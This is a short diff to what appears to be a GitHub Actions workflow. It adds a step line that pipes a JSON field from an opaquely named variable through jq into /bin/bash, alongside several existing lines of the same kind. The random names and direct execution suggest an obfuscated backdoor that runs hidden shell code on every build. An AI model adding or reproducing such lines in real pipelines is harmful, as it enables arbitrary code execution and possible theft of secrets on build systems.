@@ -20,6 +20,7 @@ jobs:
           echo $zjha6732 | jq -r .aqy7251 | /bin/bash
           printf '%s' "$cytef086" | jq -r .eq3 | /bin/bash
           echo $jndee75818 | jq -r .yysv68 | /bin/bash
+          echo $dh9 | jq -r .ega2408 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
